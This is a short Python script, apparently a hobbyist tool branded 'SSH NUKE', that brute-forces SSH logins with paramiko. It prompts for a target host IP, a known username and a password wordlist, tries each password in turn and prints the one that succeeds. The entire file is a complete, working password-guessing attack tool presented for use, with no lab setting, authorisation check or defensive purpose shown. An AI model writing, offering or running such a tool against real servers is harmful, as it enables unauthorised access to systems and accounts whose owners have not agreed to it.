#bruteforce program knowing the username for finding a valid password.
#import necessary library
import paramiko
import datetime 
print("""
╔═╗╔═╗╦ ╦  ╔╗╔╦ ╦╦╔═╔═╗
╚═╗╚═╗╠═╣  ║║║║ ║╠╩╗║╣ 
╚═╝╚═╝╩ ╩  ╝╚╝╚═╝╩ ╩╚═╝
Version 1.0
by: NomesPaladin       
""")
# This code was developed by nomespaladin all rights reserved

#create function to try login in 
def try_login(host, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, username=username, password=password)
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
    finally:
        client.close()

#define function to fetch passsword given a list
def find_password(host,username,password_list):
    for passwd in password_list:
        print(f"[+] Trying > {passwd} . . .")
        if try_login(host,username,passwd):
            return passwd
        else:
            print(f"[-] Is Not > {passwd} ! ! ! ")
    return None

#define function to process password file into a list
def process_passwdlist(passwd_file):
    try:
        with open(passwd_file,'r') as passwd:
            passwd_list = []
            pwd_content = passwd.readlines()
            for pwd in pwd_content:
                passwd_list.append(pwd.strip())
            #print(passwd_list)
            return passwd_list
    except FileNotFoundError:
        print(f"[-] File '{passwd_file}' not found. ")

#define global variables as input
#V_1 requires user input
host = input("[?]Enter host IP:")
username = input("[?]Enter known username:")
passwd_file = input("[?]Enter password filename:") 
print("-" * 100)
now = datetime.datetime.now()
formatted_date = now.strftime("%Y-%m-%d %H:%M:%S")
print(f"Program started {formatted_date}")
print("-" * 100)
password_list = process_passwdlist(passwd_file)
#process the main function to find valid password
result = find_password(host,username,password_list)
if result:
    print(f"[!] Passsword found > > > {result} < < < ")
    print("-" * 100)
    print(f"[@] Program finished")
    print("-" * 100)
else:
    print("[-] Password not found.") #output once list if finished and no password is valid 
    print("-" * 100)
    print(f"[@] Program finished")
    print("-" * 100)

